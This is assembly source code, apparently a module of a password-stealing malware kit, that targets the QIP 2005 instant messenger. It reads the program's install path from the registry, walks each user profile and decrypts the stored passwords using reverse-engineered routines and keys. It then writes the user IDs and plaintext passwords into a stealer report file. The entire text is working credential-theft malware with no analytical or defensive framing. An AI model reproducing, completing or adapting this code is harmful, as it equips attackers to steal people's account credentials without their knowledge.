      q2005_Decrypt1 PROTO :DWORD, :DWORD
      q2005_Decrypt2 PROTO :DWORD, :DWORD
           
.data?
      q2005_buf1 db 400h dup (?)
      q2005_buf2 db 400h dup (?)
      q2005_Custom2 db 400h dup (?)
      q2005_base64_str1 db 400h dup (?)
      q2005_base64_str2 db 400h dup (?)
      q2005fd WIN32_FIND_DATA <>
      q2005_hFind dd ?
      q2005_uin db 100h dup (?)
      q2005_pwd db 100h dup (?)
     
.code

GetQIP2005Pwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], QIP2005_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetQIP2005Pwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      invoke  RegRead, HKEY_CURRENT_USER, addr q2005_uninstall, addr q2005_install_loc, addr q2005_buf1, sizeof q2005_buf1, REG_READ_A
      test    eax, eax
      je      q2005_failed_1
      
      push    offset q2005_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr q2005_buf1, addr q2005_users
      
        FindFirstFile, addr q2005_buf1, addr q2005fd
        mov     dword ptr [q2005_hFind], eax
        cmp     eax, -1
        je      q2005_failed_3
        lstrlen, addr q2005_buf1
        mov     byte ptr [q2005_buf1 + eax - 1], 0
        jmp     q2005_skip_search
      q2005_search_lp:
        lstrcmp, addr q2005fd.cFileName, addr fake1
        test    eax, eax
        je      q2005_skip_search
        lstrcmp, addr q2005fd.cFileName, addr fake2
        test    eax, eax
        je      q2005_skip_search
        
        push    offset q2005fd.cFileName
        push    offset q2005_buf1
        push    offset q2005_smask
        push    offset q2005_buf2
        call    wsprintf
        add     esp, 4*4
        
        GetPrivateProfileString, addr q2005_sect_name, addr q2005_key_name, addr nilstr, addr q2005_Custom2, sizeof q2005_Custom2, addr q2005_buf2
        test    eax, eax
        je      q2005_get_custom2_err
        
        invoke  q2005_Decrypt1, addr q2005_Custom2, addr q2005_base64_str1
        
        lstrcpy, addr q2005_base64_str2, addr q2005_base64_str1
        
        lstrlen, addr q2005_base64_str1
        push    eax
        push    offset q2005_base64_str1
        call    base64_decode
        
        lstrlen, addr q2005_base64_str1
        mov     edx, eax
        mov     ecx, 1
        invoke  q2005_Decrypt2, addr q2005_base64_str1, addr q2005_base64_str2
        
        lstrlen, addr q2005_base64_str2
        push    eax
        push    offset q2005_base64_str2
        call    base64_decode
        
        lstrlen, addr q2005_base64_str2
        mov     edx, eax
        xor     ecx, ecx
        invoke  q2005_Decrypt2, addr q2005_base64_str2, addr q2005_base64_str1
        
        invoke  q2005_Decrypt1, addr q2005_base64_str1, addr q2005_base64_str2
        
        lstrlen, addr q2005_base64_str2
        push    eax
        push    offset q2005_base64_str2
        call    base64_decode
        
        lstrlen, addr q2005_base64_str2
        mov     edx, eax
        xor     ecx, ecx
        invoke  q2005_Decrypt2, addr q2005_base64_str2, addr q2005_pwd
        
        lstrlen, addr q2005_pwd
        test    eax, eax
        je      q2005_no_pwd
        
        lstrcpy, addr q2005_uin, addr q2005fd.cFileName
        
        lstrlen, addr q2005_uin
        mov     dword ptr [plen], eax
        add     dword ptr [DataSize], sizeof plen
        add     dword ptr [DataSize], eax
        WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
        mov     byte ptr [data_type], REPORT_DATA_LOGIN
        add     dword ptr [DataSize], sizeof data_type
        WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
        WriteFile, stfile, addr q2005_uin, plen, addr SNW, NULL
        
        lstrlen, addr q2005_pwd
        mov     dword ptr [plen], eax
        add     dword ptr [DataSize], sizeof plen
        add     dword ptr [DataSize], eax
        WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
        mov     byte ptr [data_type], REPORT_DATA_PWD
        add     dword ptr [DataSize], sizeof data_type
        WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
        WriteFile, stfile, addr q2005_pwd, plen, addr SNW, NULL
    q2005_no_pwd:
      
    q2005_get_custom2_err:
      
    q2005_skip_search:
      FindNextFile, q2005_hFind, addr q2005fd
      test    eax, eax
      jne     q2005_search_lp
      FindClose, q2005_hFind
    q2005_failed_3:
      
    q2005_failed_1:
      
    GetQIP2005Pwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetQIP2005Pwd endp

q2005_Decrypt1 proc uses ebx esi edi b_from:DWORD, b_to:DWORD 
        
        mov     edi, dword ptr [b_to]
        mov     ebx, dword ptr [b_from]
        lstrlen, ebx
        xor     edx, edx
        test    eax, eax
        je      r00403A21
        push    esi
      r004039E7:
        mov     cl, byte ptr [edx+ebx]
        sub     cl, 30h
        cmp     cl, 0Fh
        jbe     r004039F5
        add     cl, 0F9h
      r004039F5:
        shl     cl, 4h
        lea     esi, dword ptr [edx+1]
        shr     esi, 1
        mov     byte ptr [esi+edi], cl
        mov     cl, byte ptr [edx+ebx+1]
        sub     cl, 30h
        add     edx, 2h
        cmp     cl, 0Fh
        jbe     r00403A12
        add     cl, 0F9h
      r00403A12:
        mov     esi, edx
        shr     esi, 1
        lea     esi, dword ptr [esi+edi-1]
        or      byte ptr [esi], cl
        cmp     edx, eax
        jb      r004039E7
      r00403A21:
        shr     edx, 1
        mov     byte ptr [edx+edi], 0
        
        ret
q2005_Decrypt1 endp

q2005_Decrypt2 proc b_from:DWORD, b_to:DWORD
        LOCAL   local1:DWORD
        LOCAL   local2:DWORD
        
        .if     ecx == 0
                mov     edi, 1AC3h
                mov     local2, 38421h
                mov     local1, 64CEBh
        .else
                mov     edi, 1B5Fh
                mov     local2, 0A8C3h
                mov     local1, 6A3h
        .endif
        push    edx
        mov     eax, dword ptr [b_to]
        mov     esi, dword ptr [b_from]
      q2005_dec_lp2:
        mov     cl, byte ptr [esi]
        mov     ebx, edi
        shr     ebx, 8
        xor     bl, cl
        movzx   ecx, cl
        add     edi, ecx
        imul    edi, local2
        add     edi, local1
        mov     byte ptr [eax], bl
        inc     eax
        inc     esi
        dec     edx
        jnz     q2005_dec_lp2
        pop     edx
        
        mov     eax, edx
        add     eax, dword ptr [b_to]
        mov     byte ptr [eax], 0
        
        ret
q2005_Decrypt2 endp
